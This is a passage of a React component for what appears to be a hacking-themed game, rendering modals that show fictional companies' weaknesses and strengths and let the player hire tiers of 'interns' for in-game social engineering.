                  <FaTimes />
                </CloseButton>
              </CompaniesModalHeader>
              <CompaniesList>
                {companiesData.map((company) => {
                  const IconComponent = company.icon;
                  return (
                    <CompanyItem
                      key={company.id}
                      onClick={() => setSelectedCompany(company)}
                      whileHover={{ scale: 1.05 }}
                      whileTap={{ scale: 0.95 }}
                    >
                      <IconComponent style={{ fontSize: '2rem', marginBottom: '10px' }} />
                      <CompanyItemName>{company.name}</CompanyItemName>
                      <CompanyItemType>{company.type}</CompanyItemType>
                    </CompanyItem>
                  );
                })}
              </CompaniesList>
            </CompaniesModalContent>
          </CompaniesModal>
        )}
      </AnimatePresence>

      {/* Company Details Modal */}
      <AnimatePresence>
        {selectedCompany && (
          <CompanyDetailsModal
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            onClick={(e) => e.target === e.currentTarget && setSelectedCompany(null)}
          >
            <CompanyDetailsContent
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
              onClick={(e) => e.stopPropagation()}
            >
              <CompanyDetailsHeader>
                <CompanyDetailsTitle>
                  {selectedCompany.name}
                </CompanyDetailsTitle>
                <CloseButton onClick={() => {
                  setSelectedCompany(null);
                  setInternResults(null);
                  setHiredIntern(null);
                  setShowCompaniesModal(false);
                }}>
                  <FaTimes />
                </CloseButton>
              </CompanyDetailsHeader>

              <BackButton
                onClick={() => {
                  setSelectedCompany(null);
                  setInternResults(null);
                  setHiredIntern(null);
                }}
                whileHover={{ scale: 1.05 }}
                whileTap={{ scale: 0.95 }}
              >
                <FaChevronLeft />
                Back to Companies List
              </BackButton>

              <DetailSection>
                <DetailSectionTitle>
                  <FaExclamationTriangle />
                  Weaknesses
                </DetailSectionTitle>
                {selectedCompany.weaknesses.map((weakness, idx) => (
                  <WeaknessItem key={idx}>• {weakness}</WeaknessItem>
                ))}
                <WeaknessLevel level={selectedCompany.weaknessLevel}>
                  Weakness Level: {selectedCompany.weaknessLevel.toUpperCase()}
                  {selectedCompany.weaknessLevel === 'unclear' && ' - Social Engineering Required'}
                </WeaknessLevel>
              </DetailSection>

              <DetailSection>
                <DetailSectionTitle>
                  <FaShieldAlt />
                  Strengths
                </DetailSectionTitle>
                {selectedCompany.strengths.map((strength, idx) => (
                  <StrengthItem key={idx}>• {strength}</StrengthItem>
                ))}
              </DetailSection>

              {selectedCompany.weaknessLevel === 'unclear' && (
                <InternSection>
                  <DetailSectionTitle>
                    <FaUserTie />
                    Hire Intern for Social Engineering
                  </DetailSectionTitle>
                  <div style={{ color: '#888', marginBottom: '15px', fontSize: '0.9rem' }}>
                    This company's weaknesses are unclear. Hire an intern to perform social engineering and gather intelligence.
                  </div>
                  {internTiers.map((intern) => (
                    <InternTier
                      key={intern.id}
                      selected={hiredIntern?.companyId === selectedCompany.id && hiredIntern?.intern.id === intern.id}
                      onClick={() => handleHireIntern(selectedCompany, intern)}
                      whileHover={{ scale: 1.02 }}
                      whileTap={{ scale: 0.98 }}
                      disabled={(gameState.phone.owned ? gameState.phone.money : gameState.money) < intern.price}
                    >
                      <InternTierName>{intern.name}</InternTierName>
                      <InternTierDetails>{intern.description}</InternTierDetails>
                      <InternTierPrice>${intern.price.toLocaleString()} • {intern.speed}h • Quality: {Math.round(intern.quality * 100)}%</InternTierPrice>
                    </InternTier>
                  ))}
                </InternSection>
              )}

              {internResults && hiredIntern?.companyId === selectedCompany.id && (
                <InternResults>
                  <InternResultsTitle>
                    <FaCheckCircle />
                    {internResults.internName} Report ({internResults.timeTaken}h)
                  </InternResultsTitle>
                  <InternResultsText>
                    <strong>Discovered Weaknesses:</strong><br />
                    {internResults.discoveredWeaknesses.map((w, idx) => (
                      <div key={idx} style={{ marginLeft: '20px', marginTop: '5px' }}>• {w}</div>
                    ))}
                    {internResults.additionalInfo.length > 0 && (
                      <>
                        <br />
                        <strong>Additional Intelligence:</strong><br />
                        {internResults.additionalInfo.map((info, idx) => (
                          <div key={idx} style={{ marginLeft: '20px', marginTop: '5px', color: '#00ff41' }}>✓ {info}</div>
                        ))}
                      </>
                    )}
                  </InternResultsText>
                </InternResults>
              )}

              <ConfirmButton
                onClick={handleCompanySelected}
                whileHover={{ scale: 1.05 }}
                whileTap={{ scale: 0.95 }}
              >
                <FaCheckCircle />
                Select This Company & Continue
              </ConfirmButton>
            </CompanyDetailsContent>
          </CompanyDetailsModal>
        )}
      </AnimatePresence>
    </InvestigationContainer>
  );
};

export default InvestigationInterface;

